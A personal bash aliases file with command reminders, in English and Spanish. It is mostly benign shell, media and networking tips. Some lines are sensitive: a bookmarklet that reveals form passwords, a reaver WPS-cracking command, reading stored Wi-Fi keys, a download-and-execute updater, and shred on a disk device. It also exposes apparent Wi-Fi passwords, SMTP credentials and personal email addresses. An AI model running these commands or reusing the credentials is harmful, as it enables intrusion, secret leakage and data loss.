##### alias shorturl='fshorturl() { curl -s http://tinyurl.com/api-create.php?url="$1"; echo; }; fshorturl'
##### 
##### # add text to dump into a window having the focus after 3 secons
##### alias textdump='sleep 3 && xdotool type --delay 0ms '
##### # sleep 5 === read -st 5 X
##### 
##### # randomness' beauty
##### alias rndstring='curl -s "http://www.random.org/strings/?num=1&len=20&digits=on&upperalpha=on&loweralpha=on&unique=on&format=plain&rnd=newu"'
##### 
##### # more random? is possible to be more random?
##### alias rndstring2='</dev/urandom tr -dc "$(echo -n {a..z}; echo -n {A..Z}; echo -n {0..9};)" | head -c8'
##### # < /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c${1:-16};echo;
##### 
##### # so, don't need a browser, cool
##### alias gmail="curl -u karpoke --silent 'https://mail.google.com/mail/feed/atom' | sed 's/<feed.*>/<feed>/' | xmlstarlet sel -T -t -m //entry -v 'modified' -o ' ' -v 'title' -n -o '   ' -v 'author/name' -o ' (' -v 'author/email' -o ') - '  -v 'link/@href' -n"
##### 
##### # what the hell is open here
##### alias lsofd="lsof -u karpoke -a +D ." # dir ## show files open in directory by the given user
##### # lsof +D /tmp  # files open in directory
##### 
##### # as usual...
##### alias busy='my_file=$(find /usr/include -type f | sort -R | head -n 1); my_len=$(wc -l $my_file | awk "{print $1}"); let r=$RANDOM%$my_len 2>/dev/null; vim +$r $my_file'
##### alias busy2='for i in {0..100}; do echo $i; sleep 6; done | dialog --gauge "Compiling..." 6 40' # 10 min
##### alias busy3='while true; do head -n 100 /dev/urandom; sleep .5; done | hexdump -C | grep "ca fe"'
##### alias busy4='while :;do echo -e \"\033[1mCHECKING\033[0m $(find /usr/include -type f | sort -R | head -n 1)\";sleep $((RANDOM%2));done'
##### alias busy5='cycle(){ while :;do((i++));echo -n "${3:$(($i%${#3})):1}";sleep .$(($RANDOM%$2+$1));done;}; cycle 1 3 $(openssl rand 100 | xxd -p)'
##### alias busy6='j=0;while true; do let j=$j+1; for i in $(seq 0 20 100); do echo $i;sleep 1; done | dialog --gauge "Install part $j : `sed $(perl -e "print int rand(99999)")"q;d" /usr/share/dict/words`" 6 40;done'
##### # http://hackertyper.net/
##### 
##### # snow flakes in your terminal
##### #clear;while :;do echo $LINES $COLUMNS $(($RANDOM%$COLUMNS));sleep 0.1;done|gawk '{a[$3]=0;for(x in a) {o=a[x];a[x]=a[x]+1;printf "\033[%s;%sH ",o,x;printf "\033[%s;%sH*\033[0;0H",a[x],x;}}'
##### #clear;while :;do echo $LINES $COLUMNS $(($RANDOM%$COLUMNS)) $(printf "\u2744\n");sleep 0.1;done|gawk '{a[$3]=0;for(x in a) {o=a[x];a[x]=a[x]+1;printf "\033[%s;%sH ",o,x;printf "\033[%s;%sH%s \033[0;0H",a[x],x,$4;}}'
##### 
##### # my password always was a bunch of asterisks
##### alias get_form_passwords='echo javascript:(function(){var s,F,j,f,i; s = ""; F = document.forms; for(j=0; j<F.length; ++j) { f = F[j]; for (i=0; i<f.length; ++i) { if (f[i].type.toLowerCase() == "password") s += f[i].value + " "; } } if (s) alert("Passwords in forms on this page: " + s); else alert("There are no passwords in forms on this page.");})();'
##### 
##### # bad boys
##### alias rk='sudo rkhunter -c --sk --update'
##### 
##### # url encode, great
##### alias urlenc='furlenc() { od -An -w999 -t xC "$1" | sed "s/[ ]\?\(c[23]\) \(..\)/%\1%\2/g;s/ /\\\\\x/g" | xargs echo -ne; }; furlenc'
##### alias urlenc='furlenc() { perl -MURI::Escape -e "print uri_escape('\''$1'\'');"; }; furlenc'
##### # $ echo -ne 'cederrón' | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g'
##### # $ php -r "echo urlencode(utf8_decode('cederrón'));"
##### # $ echo -ne 'cederrón' | hexdump -v -e '/1 "%02x"' | sed 's/\(..\)/%\1/g'
##### # $ python -c "import urllib; print urllib.quote('''cederrón''')"
##### # $ echo -ne cederrón | uni2ascii -aJ
##### # $ ruby -r cgi -e 'puts CGI.escape(ARGV[0])' "cederrón"
##### # $ echo -ne cederrón | php -r "echo urlencode(file_get_contents('php://stdin'));"
##### 
##### # url decode
##### alias urldec='furldec() { echo "$1" | sed -e'\''s/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g'\'' | xargs echo -e; }; furldec'
##### 
##### # convert latin chars
##### # $ sed -i 'y/áÁàÀãÃâÂéÉêÊíÍóÓõÕôÔúÚñÑçÇ/aAaAaAaAeEeEiIoOoOoOuUnNcC/' fichero
##### 
##### # convert latin chars based upon line number
##### # sed "$(\grep -n '^Tags: ' pensamiento-profundo/el-dia-negado.md | awk -F: '{print $1}')y/áÁàÀãÃâÂéÉêÊíÍóÓõÕôÔúÚñÑçÇ/aAaAaAaAeEeEiIoOoOoOuUnNcC/" pensamiento-profundo/el-dia-negado.md
##### 
##### # broken links
##### alias broken-links='wget --spider --no-parent -o log.txt -r'
##### #  wget --spider --no-parent -r --no-check-certificate --http-user=karpoke --http-password=$pass -o log.txt https://terminus.dyn.ignaciocano.com
##### 
##### # the beauty of code reduces the entropy (pretty print html)
##### alias pp_html='tidy -m -i -utf8'
##### alias pp_python='fpp_python() { cat "$1" | python -m json.tool | pygmentize -l js; } fpp_python'
##### # remember: xml_pp, | python -mjson.tool, indent
##### 
##### # rot13
##### alias rot13='frot13() { echo "$@" | tr "[A-Za-z]" "[N-ZA-Mn-za-m]"; }; frot13'
##### 
##### # updaters
##### alias macup='mkdir -p ~/.linuxcounter && wget -O ~/.linuxcounter/machine-update http://counter.li.org/scripts/machine-update && chmod +x ~/.linuxcounter/machine-update && ~/.linuxcounter/machine-update -i'
##### # 420250
##### # terminus, pruebas, skynet, anacreonte, danus, smyrno
##### 
##### # update dyndns host
##### alias update_dyndns='inadyn -u $USER -p $PASSWORD --iterations 1 --dyndns_system custom@dyndns.org -a terminus.homelinux.com'
##### 
##### # add svn files recursively
##### #alias svnadd="svn status |grep '\?' |awk '{print $2}'| xargs svn add"
##### alias svnadd='svn status | grep "\?" |awk '\''{print $2}'\''| xargs svn add'
##### 
##### # get location coordinates: findloc 23.5, 12.6
##### alias findloc="findlocation() { place=`echo $* | sed 's/ /%20/g'` ; curl -s 'http://maps.google.com/maps/geo?output=json&oe=utf-8&q=$place'; }; findlocation"
##### 
##### # programs-size
##### alias program_sizes='dpkg-query --show --showformat='\''${Package;-50}\t${Installed-Size}\n'\'' | sort -k 2 -n | grep -v deinstall | awk '\''{printf "%.3f MB \t %s\n", $2/(1024), $1}'\'' | tail -n 10'
##### 
##### # qr code for url
##### alias qrurl='qrurl() { curl "http://chart.apis.google.com/chart?chs=150x150&cht=qr&chld=H|0&chl=$1" -o qr.$(date +%Y%m%d%H%M%S).png; }; qrurl'
##### 
##### # calculator
##### alias ?='fcalc () { echo "$*" | bc -l; }; fcalc'
##### # convertir a binario: $ echo "ibase=10;obase=2; 2015" | bc
##### 
##### # python calculator
##### alias pcalc='python -ic "from math import *; from random import *"'
##### 
##### # scan wireless
##### alias ws="sudo iwlist wlan0 scan | sed -ne 's#^[[:space:]]*\(Quality=\|Encryption key:\|ESSID:\)#\1#p' -e 's#^[[:space:]]*\(Mode:.*\)$#\1\n#p"
##### 
##### # search in wikipedia
##### alias wiki='fwiki() { dig +short txt $1.wp.dg.cx; }; fwiki'
##### 
##### # show terminal shortcut keymapping
##### alias terminal_shortcuts='echo -e "Terminal shortcut keys\n" && sed -e "s/\^/Ctrl+/g;s/M-/Shift+/g" <(stty -a 2>&1| sed -e "s/;/\n/g" | grep "\^" | tr -d " ")'
##### 
##### alias pascal='for((r=1;r<10;r++));do v=1;echo -n "$v ";for((c=1;c<$r;c++));do v2=$(($(echo "$v*($r-$c)/$c")));echo -n "$v2 ";v=$v2;done;echo;done'
##### 
##### # html2pdf
##### alias html2pdf='fhtml2pdf() { html2ps -W b "$1" | ps2pdf - "$2"; }; fhtml2pdf'
##### 
##### # lan discovery: $1, p.ex, 192.168.0
##### alias lan_discovery='fld() { for i in $(seq 1 255); do ping -c 1 $1.$i >/dev/null & /usr/sbin/arp -na | grep "\($1" | egrep "[0-9a-fA-F]+:[0-9a-fA-F]+:[0-9a-fA-F]+:[0-9a-fA-F]+:[0-9a-fA-F]+:[0-9a-fA-F]+"; done; fld'
##### 
##### # recover flash videos
##### alias recover_flash='for h in $(find /proc/*/fd -ilname "/tmp/Flash*" 2>/dev/null); do ln -s "$h" $(readlink "$h" | cut -d" " -f1); done'
##### 
##### # $1 = text, $2 = filename, $3 = version (default = 3)
##### #alias qrencode='fqrencode() { python -c "import qrcode;e=qrcode.Encoder();e.encode('\''$1'\'',version=${3:-3},mode=e.mode.BINARY, eclevel=e.eclevel.H).save('\''$2'\'')"; }; fqrencode'
##### # # $1 filename
##### #alias qrdecode='fqrdecode() { python -c "import qrcode;d=qrcode.Decoder();print d.result if d.decode('\''$1'\'') else '\''Error'\''"; }; fqrdecode'
##### # display directly:  qrencode "some text" -o- | display
##### # qrencode # package
##### alias qrdecode='zbarimg' # package: zbar-tools
##### # wifi connection:  WIFI:S:CAZUELITAS;T:WPA;P:321110800;;
##### # wifi connection:  WIFI:S:MOVISTAR_E43D;T:WPA2;P:PHNY6EctMhaEcuqUEqfM;;
##### # http://www.ignaciocano.com/tools/qr.php?data=WIFI:S:ONOA182;T:WPA;P:1014432951;;
##### 
##### alias update_m3u='fapg --format=m3u --output=/home/karpoke/Escritorio/music.m3u /home/karpoke/Música/mp3; sed -i "s/Ãº/ú/" /home/karpoke/Escritorio/music.m3u'
##### 
##### alias say='fsay() { local IFS=+;mplayer "http://translate.google.com/translate_tts?q=$*"; }'
##### 
##### alias sortfast="sort -S$(($(sed '/MemT/!d;s/[^0-9]*//g' /proc/meminfo)/1024-200)) --parallel=$(($(grep -c ^proc /proc/cpuinfo)*2))"
##### 
##### alias testt='testt(){ o=abcdefghLkprsStuwxOGN;echo $@;for((i=0;i<${#o};i++));do c=${o:$i:1};test -$c $1 && help test | sed "/^ *-$c/!d;1q;s/^[^T]*/-$c /;s/ if/ -/";done; }; testt'
##### 
##### # sort by length
##### alias sortl='awk '\''{print length($0),$0}'\'' | sort -n'
##### 
##### # avoid update or delete without limits or where clauses
##### alias mysql='mysql --safe-updates'
##### 
##### # muestra una notificación
##### #alias alert='notify-send --urgency=low -i "$([ $? -eq 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
##### #alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
##### alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history 1|sed '\''s/^\s*[0-9]\+\s\+\(.*\)[;&|]\s*alert$/\1/'\'')"'
##### 
##### # top ten most executed commands
##### alias topten='history | awk '\''{print $2}'\'' | sort | uniq -c | sort -rn | head'
##### 
##### # show map by name
##### alias ppmap='(type fppmap >/dev/null 2>&1) || fppmap() { pmap $(pgrep "$1"); }; fppmap'
##### 
##### 
##### alias isprime='fisprime() { perl -wle '\''if ((1 x shift) !~ /^1?$|^(11+?)\1+$/) {print 1} else {print 0}'\'' "$1"; }; fisprime'
##### # testing:  primes 1 1000 | while read n; do isprime $n; done | grep -v 1
##### 
##### alias starttunnel='sshuttle --D --pidfile=/tmp/sshuttle.pid -r <server> --dns 0/0'  # -r user@server:port
##### alias stoptunnel='[[ -f /tmp/sshuttle.pid ]] && kill `cat /tmp/sshuttle.pid`'
##### 
##### decorator yt 'youtube-dl --extract-audio --audio-format mp3 "ytsearch: $*"'
##### 
##### # dockerize
##### 
##### # curl w/ http2 support
##### 
##### # https://hub.docker.com/r/badouralix/curl-http2/
##### # ex: curl-http2 -I https://nghttp2.org/
##### alias 'curl-http2'='docker run -t --rm badouralix/curl-http2'
##### 
##### ## reminder (a couple of things that I think they are interesting but not so frequent to give them an alias, or simple it has no sense to give them one)
##### 
##### # día a partir de un timestamp y una fecha # date -d '1970-01-01 1234567890 sec GMT'
##### # día a partir de un timestamp # date -d @1234567890
##### # día de ayer YYYYmmdd # date -d yesterday +%Y%m%d
##### # dia de mañana YYYYmmdd # date -d tomorrow +%Y%m%d
##### # change access time: touch -a -t 0712250000
##### # change modification time: touch -m -d '2007-01-31 8:46:26'
##### # fecha de ficheros:  for i in full-iso long-iso iso locale; do echo $i; ls -l ejemplo --time-style=$i; done
##### # enviar html por mail # mailx bar@foo.com -s "HTML Hello" -a "Content-Type: text/html" < body.htm
##### # enviar html por mail #  sendmail -t email_recipient@domain.com < email.html
##### # enviar por mail uuencodeado # uuencode todo.tgz | mail -s "todo ssl" karpoke@gmail.com
##### # enviar adjunto: 
##### #   mpack -s "asunto: fichero adjunto" -d description.txt ./data.pdf karpoke@gmail.com
##### #   sendemail -t correo_a@servidor.com -f correo_Desde@servidor.com -m "Un mensaje" -u "Un asunto -a "archivo1.txt" "archivo2.txt"
##### #   echo test | mutt -a file.txt ....
##### # send email:
##### #   ssmtp
##### #   msmtp
##### #   http://caspian.dotconf.net/menu/Software/SendEmail/
##### #   sendEmail -o tls=yes -f booksimon@gmail.com -t karpoke@gmail.com -s smtp.gmail.com:587 -xu booksimon@gmail.com -xp password -u "Hello from sendEmail" -m "How are you? I'm testing sendEmail from the command line."
##### #   sendEmail -o tls=yes -f 384506cd501f4d6f2@mailtrap.io -t karpoke@gmail.com -s smtp.mailtrap.io:2525 -xu 384506cd501f4d6f2 -xp 57de04d33985fa -u "subject" -m "message"
##### # wakeonlan -i 191.168.1.5 00:03:0d:3c:f4:19 # terminus
##### # wake on lan:  ethtool -s eth0 wol g
##### # wake at time:   sudo rtcwake -m [stanby*|mem|disk|no] -t $(date +%s -d 'tomorrow 08:15') || rtcwake -m show
##### # emergency swap
##### #  partition:
##### #    $ mkswap /dev/sdx
##### #    $ swapon /dev/sdx
##### #  file:
##### #    $ dd if=/dev/zero of=/path/to/swapfile bs=1M count=1024 # For 1GB swap file
##### #    $ mkswap /path/to/swapfile
##### #    $ swapon /path/to/swapfile
##### #   dphys-swapfile:
##### #    /etc/dphys-swapfile
##### #    CONF_SWAPSIZE=100
##### #    If you want to change the size, you need to modify the number and restart dphys-swapfile:
##### #    /etc/init.d/dphys-swapfile stop
##### #    /etc/init.d/dphys-swapfile start
##### # zram (200mb compressed swap):   grep -i zram /boot/config-`uname -r` | free -m | modprobe zram && echo $((200*1048576)) > /sys/block/zram0/disksize | mkswap /dev/zram0 && swapon -p 10 /dev/zram0
##### # make iso:   dd if=/dev/dvd of=/tmp/dvd.iso ## dd if=/dev/cdrom of=/tmp/cdrom.iso
##### # install retropie: dd bs=4M if=retropie-4.3-rpi2_rpi3.img of=/dev/mmcblk0 conv=fsync
##### # create certaine size file: $ dd if=/dev/zero of=tmpfile  bs=1M  count=10
##### # create certaine size random file: $ dd if=/dev/urandom of=tmpfile  bs=1M  count=10
##### # crear una imagen con texto:  echo -e "Some Text Line1\nSome Text Line 2" | convert -background none -density 196 -resample 72 -unsharp 0x.5 -font "Courier" text:- -trim +repage -bordercolor white -border 3 text.gif
##### # crear imágenes de test:   for i in {1..100}; do convert -background lightblue -fill blue -size 100x100 -pointsize 24 -gravity center label:$i $i.jpg; done
##### # crear un gif a partir de imágenes:   mogrify -delay 100 -loop 0 *.jpg salida.gif
##### # crear un gif a partir de un video:  openshot
##### # make image semi transparent:  $ convert input.png -alpha set -channel A -fx 0.5 output.png
##### # drill holes on image:  convert -size 20x20 xc:white -fill black -draw "circle 10,10 14,14" miff:- | composite -tile - input.png -compose over miff:- | composite - input.png -compose copyopacity output.png
##### # save command output to image.  $ ifconfig | convert label:@- ip.png
##### # grayscale image.  $ convert input.png -colorspace Gray output.png
##### # add border to image:  $ convert input.png -mattecolor gold -frame 10x10+5+5 output.png
##### # remove border of image:  $ convert input.png -shave 10x10 output.png
##### # resize image: convert $file -resize 800x600 resized-$file
##### # resize maintaining the aspect ratio:    mogrify -resize SIZE_IN_PIXELS *.jpg
##### # convert pdf to image:   convert file.pdf file.png || eg. convert -d 300 foo.pdf bar.png
##### # convert pdf to image: pdftoppm -rx 300 -ry 300 -png file.pdf prefix
##### # crop image: $ mogrify -crop <width>x<height>+<X-offset>+<Y-offset> *.png
##### # show ecrypt mount passphrase: ecryptfs-unwrap-passphrase ~/.ecryptfs/wrapped-passphrase
##### # montar un directorio compartido de windows: smbmount //<ip>/<resource> <local_mount_point>
##### # montar android escritura:   mount -o rw,remount -t yaffs2 /dev/block/mtdblock3 /system # acuerdate de volver a dejarlo como estaba
##### # montar hfsplus (mac): api hfsprog;  sudo mount -o rw,remount,force /media/usb1
##### # mount -o rw,remount -t yaffs2 /dev/block/mmcblk0p9 (cm10.2)
##### # activar mhl hdmi en galaxy s2 samsung android 4.3... ro.hdmi.enable=true en /system/build.prop  (falta confirmar)
##### # reformat galaxy s2: heimdall flash --repartition --pit I91001GB_6GB.pit --KERNEL zImage --no-reboot
##### # actualizar android tools desde el terminal:   android update sdk --no-ui
##### # ver redes wifi android (root):  /data/misc/wifi/wpa_supplicant.conf
##### # execute activity: su (para ejecutar siguente comando como root);  # am start -n com.whatsapp/com.whatsapp.HomeActivity
##### # ver contraseña wifi:
##### #  essid=$(iwconfig 2>/dev/null | awk -F\" /ESSID/'{print $2}')
##### #  sudo cat /etc/NetworkManager/system-connections/*$essid* | grep psk=
##### # hack wps:   sudo  reaver -i wlan0 -b 00:01:02:03:04:05 ## bssid  ## previous set wifi card in monitor mode:  sudo ifconfig wlan0 down sudo iwconfig wlan1 mode && sudo ifconfig wlan1 up
##### # backup efs (a must in samsung phones):  adb shell | su | busybox tar zcvf /sdcard/efs-backup.tar.gz /efs
##### # mount crypted partition in android:
##### #  1) activate recovery (ex: pressing at the same time: power on, volume up and home)
##### #  2) from pc:
##### #  adb shell
##### #  ~ #
##### #  ## montar el sistema de ficheros (encriptado) /data con estos comandos (Android Device Encryption):
##### #  ~ # setprop ro.crypto.state encrypted
##### #  setprop ro.crypto.state encrypted
##### #  ~ # vdc cryptfs checkpw 'CLAVE_DE_ENCRIPTACION_DE_VICENTE'
##### #  vdc cryptfs checkpw 'CLAVE_DE_ENCRIPTACION_DE_VICENTE'
##### #  200 0 0
##### #  ~ # mount -o ro /dev/block/dm-0 /data
##### #  mount -o ro /dev/block/dm-0 /data
##### #  3) copy files
##### #  adb pull /data/media/0
##### # change android selinux enforcement:
##### #  $ su
##### #  $ setenforce 0   ## 0 permissive, 1 to enforce
##### # recover efs:   http://www.htcmania.com/showthread.php?t=222675
##### # list samba shares:  smbclient -N -gL \\SambaServer 2>&1 | grep -e "Disk|" | cut -d'|' -f2
##### # get samba directory's IP:  smbtree (take the name, ex: nas-smb, that means that name is advertised to the network with Bonjour) && ping -c 1 nas-smb.local (sufix .local!!!!)
##### # show directory tree: $ ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
##### # start another graphical terminal: startx -- :1
##### # start another X instance: startx -- /usr/X11R6/bin/Xnest :5 -geometry 800x600
##### # mouse tracking: while true; do xdotool getmouselocation | sed 's/x:\(.*\) y:\(.*\) screen:.*/\1, \2/' >> ./mouse-tracking; done
##### # plot mouse tracking: gnuplot -persist <(echo "unset key;unset border;unset yzeroaxis;unset xtics;unset ytics;unset ztics;plot './mouse-tracking' with points lt 1 pt 6 ps variable")
##### # empty a file: :>file ## or ##  >file
##### # empty a file: sed -i -n '/%/p' file
##### # recursively remove empty directories:   $ find . -type d -empty -delete
##### # find files for which doesn't exist user or group: find / \( -nouser -o -nogroup \) -ls
##### # find binary files: find . -maxdepth 1 -type f | perl -lne 'print if -B'
##### # find files by its header: find . -type f -exec awk 'FNR > 1 {nextfile} $1 ~ /VimCrypt/ {print FILENAME}' {} +
##### # get key codes: xev | grep -A2 --line-buffered '^KeyRelease' | sed -n '/keycode /s/^.*keycode \([0-9]*\).* (.*, \(.*\)).*$/\1 \2/p'
##### # xmodmap -pke # distribucion # xmodmap .Xmodmap  # crea el fichero  # xmodmap -e "keycode 133 = Pointer_Button2" # asocia la tecla windows al click de la rueda del raton
##### # xmodmap -e "keycode 134 = Pointer_Button5"
##### # xmodmap -pm  # show special keys
##### # get keycode preseed:  $ sudo showkey -k
##### # show keymapping:  stty -a
##### # sending signals keymapping:   $ stty -a | grep intr
##### # limit terminal number of columns:   $ stty columns 250
##### # set keyboard mapping:   setxkbmap es | setxbmap -print | setxbmap es -print
##### # change caps lock to backspace:   $ setxkbmap -option caps:backspace
##### # reset input device: xinput || xinput disable ID || xinput enable ID
##### # change mouse deceleration and scaling:
##### #  http://510x.se/notes/posts/Changing_mouse_acceleration_in_Debian_and_Linux_in_general/
##### #  https://wiki.archlinux.org/index.php/Mouse_acceleration
##### #  xinput --set-prop '<MOUSE NAME>' 'Device Accel Constant Deceleration' 2.2
##### #  xinput --set-prop '<MOUSE NAME>' 'Device Accel Velocity Scaling' 8
##### # luego ir a Sistema > preferencias > teclado > permitir controlar el raton con el teclado númerico
##### # attach screen over ssh:   $ ssh user@host -t screen -r
##### # deattach screen: ^ad   reattach: screen -r
##### # send command to all terminals in screen:  $ <ctrl+a>:at "#" stuff "echo hello world^M"
##### # at:
##### #  at now || at midnight || at teatime (4pm)|| at 10:00 || at -t 12312359 # MMddhhmm
##### #  atq | atrm | batch
##### # añadir repostiorio ppa: sudo add-apt-repository ppa:nombre-del-ppa
##### # create crypted file:
##### #  vim +x filename
##### #   vim -x +"set cm=blowfish2" bar.txt  # zip|blowfish|blowfish2
##### #  vim +X filename # configure cipher once we open the file, then
##### #    :setlocal cm=zip  ...or blowfish|blowfish2
##### # guardar cuando se ha abierto sin permisos:  :w !sudo tee % ó :w !sudo tee [ > /dev/null ] % # entre corchetes-> para evitar el echo to stdout
##### # rot13 from inside vim:  ggg?G
##### # vim hex mode:   :%!xxd
##### # generate 30x30 matrix:  xxd -p /dev/urandom |fold -60|head -30|sed 's/\(..\)/\1 /g'
##### # start simple static html server: $ while true; do nc -l -p 8080 < index.html; done > log # under mantainment
##### # start simple php server:  php -S 127.0.0.1:8080
##### # start simple server: $ (2.x) python -m SimpleHTTPServer 8080 (default 8000) (3.x) python -m http.server 8080
##### # start simple relay smtp server: $ python -m smtpd -n localhost:1125 smtp-relay:25
##### # start simple smtp server:  $ python -m smtpd -n -c DebuggingServer localhost:1025
##### # start simple ftp server:  $ sudo python -m pyftpdlib -p2121 -w  # with -w gives write access
##### # test smtp with telnet:
##### #     $ telnet localhost 1125
##### #     Trying 127.0.0.1...
##### #     Connected to localhost.
##### #     Escape character is '^]'.
##### #     220 lab01 Python SMTP proxy version 0.2
##### #     mail from: test@foo.com
##### #     250 Ok
##### #     rcpt to: test@bar.com
##### #     250 Ok
##### #     data
##### #     Subject: Correo de prueba
##### #
##### #     Esto es una prueba
##### #     .
##### #     250 Ok
##### #     quit
##### # ping + traceroute: mtr google.com
##### # find last command w/o exec: !whatever:p
##### # ejecutar el comando anterior sustituyendo foo por bar: ^foo^bar^  # sustituyendo todas las apariciones: !!:gs/foo/bar
##### #  !! # comando anterior
##### #  !* # argumentos del comando anterior
##### #  !!:2 # segundo argumento del comando anterior
##### #  !!:2-4 # del segundo al cuarto
##### #  !!:3-$ # del tercero al último
##### #  !!:^-3 # del primero al tercero
##### #  !:- # comando anterior sin el último argumento
##### #  !-1 # comando anterior (igual que !!)
##### #  !-2 # penúltimo comando
##### #  !-3 # antepenúltimo
##### #  !!:p # último sin ejecutarlo
##### #  !-3:p # antepenúltimo sin ejecutarlo
##### #  $_ # contiene el objeto del último comando (ej: mkdir tmp --> $_ = tmp)
##### #  ^asdf^qwer: run last command replacing asdf with qwer
##### #  ^asdf: run last command deleting asdf
##### #  !!:gs/foo/bar: run las command replacing foo with bar
##### # ejecutar el último comando eliminando algunos caracteres:  ladfs || ^adf -> ejecuta "ls"
##### # poner un espacio delante de un comando hace que no se guarde en el historial
##### # copy a tar file from ssh server: ssh -c 'tar cvzf - -C /path/to/src/*' | tar xzf -
##### # copy a ssh key: your-machine$ ssh-copy-id remote-mache ## or your-machine$ ssh remote-machine 'cat >> .ssh/authorized_keys' < .ssh/identity.pub
##### # generate ssh rsa key:  ssh-keygen -t rsa -b 4096 -f ~/.ssh/<ROLE>_rsa -C "Comment goes here"
##### # generate ssh ecdsa key: ssh-keygen -t ecdsa -b 384
##### # fingerprint ssh server keys: for file in *sa_key.pub; do ssh-keygen -lf $file; done
##### # check ssh private and public keys:   $ diff <(ssh-keygen -y -f ~/.ssh/id_rsa) <(cut -d' ' -f1,2 ~/.ssh/id_rsa.pub)
##### # get public key from private:
##### #  ssh-keygen -yf ejemplo.rsa
##### #   openssl rsa -in key.priv -pubout > key.pub
##### # check vuln keys: ssh-vulnkey -v ssh_host_dsa_key
##### # traerse un fichero con ssh: ssh user@host "cat filename" | tar jpxf -
##### # enviar un fichero con ssh: tar jcpf - dir/ | ssh user@host "cat > /path-to-save-the-file.bz2"
##### # ssh tunnel from remote:80 to local:2001:   ssh -N -L2001:localhost:80 somemachine
##### # micro to remote speakers dd if=/dev/dsp | ssh -p2222 -c arcfour -C user@host dd of=/dev/dsp
##### # arecord -f dat | ssh -C user@host aplay -f dat
##### # remote micro to local speakers:  sudo ssh -p2221 -c arcfour -C karpoke@terminus.homelinux.com 'dd bs=1k if=/dev/dsp' > /dev/audio
##### # remote screenshot:   ssh user@remote-host "DISPLAY=:0.0 import -window root -format png -"|display -format png -
##### # access a host through other:
##### #  ssh -t reachable_host ssh unreachable_host
##### # access through proxy host:
##### #  ssh -t <jumphost> -t <destinationhost>
##### #  alternative in ~./ssh/config
##### #    host <destinationhost>
##### #      user <username>
##### #      ProxyCommand ssh tpgateway -W %h:%p 2>/dev/null
##### # execute screen based command in remote host as local: ssh -t host htop
##### # execute screen based command in unreacheable host:  
##### #  ssh -t -p2245 proyectos@porta.roiback.com ssh -t ncano@192.168.1.20 htop
##### # connect to unreachable host:
##### #  ssh -t -p2245 proyectos@porta.roiback.com  ssh -p2279 ncano@192.168.1.20
##### # capture video linux desktop: $ ffmpeg -f x11grab -s wxga -r 25 -i :0.0 -sameq /tmp/out.mpg
##### # capture video linux desktop: ffmpeg -f x11grab -r 25 -s 800×600 -t 5 -aspect 16:9 -b 4000k -i :0.0 mivideo.mpg
##### # cut video:  ffmpeg -vcodec copy -acodec copy -i Video_Original.flv -ss 00:00:09 -t 0:0:16 Video_Salida.flv
##### # reduce frame rate:  ffmpeg -i Video_Salida.flv -f yuv4mpegpipe - | yuvfps -s 12:1 -r 12:1 | ffmpeg -f yuv4mpegpipe -i - -b 28800k camara_lenta.flv
##### # convert to html5:  $ ffmpeg -i input_file.mp4 -strict experimental output_file.webm
##### # repeat string:
##### #  perl -e 'print "+"x50'
##### #  echo -e ' '$_{1..50}'\b\b+'
##### # print perl error messages perl -le 'print $!+0, "\t", $!++ for 0..127'
##### # display network name: nmblookup -A <ip>
##### # listening on tcp ports: netstat -tlnp
##### # kill connections: tcpkill host <ip>  (package:dsniff)
##### # check if is a DoS:  netstat -ant | grep SYN_RECV | wc -l
##### # get listening ports:  ss -ln | awk '$3~/([0-9]+)/{print $3}' | sed 's/.*\:\([0-9]\+\)$/\1/'
##### # sustituir la siguiente linea $ sed -i.backup '/patter/{n;s/foo/bar/g}' file
##### # mostrar solo las lineas impares:  sed 2~2d
##### # evitar el uso de un alias: \ls
##### # $ if [ "x${a/$b/}" != "x$a" ]; then echo "'$b' is in '$a'"; fi
##### # if [ $cond ] && do-if-true || do-if-false
##### # copiar de vim a clipboard:  $ :%y *   ## $ !xclip -i %
##### # copy file to clipboard:  xclip file.txt
##### # access clipboard:  echo asdf | xclip || xclip -o || xclip -o -selection c [primary|secondary|clipboard]
##### # sort lines on clipboard:  xclip -o -selection clipboard | sort | xclip -i -selection clipboard
##### # copy output to clipboard:  ifconfig|xsel --clipboard
##### # paste clipboard: xsel -b
##### # clear clipboard: xsel --clear --clipboard || xsel -bc
##### # copy|paste primary: ifconfig | xsel -p || xsel -p
##### # desensamblar un binario: $ objdump -b binary -m i386 -D shellcode.bin
##### # desensamblar un shellcode: echo -ne "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80" | x86dis -e 0 -s intel
##### # convertir datos binario en shellcode:  $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' <bin_file>
##### # analyze url for non ascii chars:  echo ¿o¿r¿¿¿¿.com | hexdump -c
##### # hexdump string: echo "hello, climagic" | od -t x1 -A"n" | tr "\n" " " | tr -d " "
##### # change splash image:  gksu -u gdm dbus-launch gnome-appearance-properties
##### # really remove a file:  
##### #  shred -vzn 1 /dev/sda1
##### #  shred --force --remove --zero --verbose filename
##### #  shred -ubzn 2 /ruta/archivo
##### # loop video song:  mplayer -loop 10 | -loop 0
##### # ascii video: mplayer -vo aa video.avi
##### # play video in ascii: vlc -I ncurses -> and then "B"  (z: vol up, a: vol down, space bar: stop/start, s: pause, q: exit)
##### # view image in ascii:  cacaview image.jpg
##### # color video: mplayer -vo caca video.avi
##### # webcam window:  mplayer -cache 128 -tv driver=v4l2:width=176:height=177 -vo xv tv:// -noborder -geometry "95%:93%" -ontop
##### # webcam to file:  cvlc "v4l2:///dev/video0" --sout "#transcode{vcodec=mp2v,vb=800,scale=0.25,acodec=none}:file{mux=mpeg1,dst=/PATH/TO/OUTPUT/FILE}"
##### # webcam capture:  ffmpeg -y -r 1 -t 3 -f video4linux2 -vframes 1 -s sxga -i /dev/video0 ~/webcam-$(date +%m_%d_%Y_%H_%M).jpeg # -s [qqvga|vga|svga|sxga]
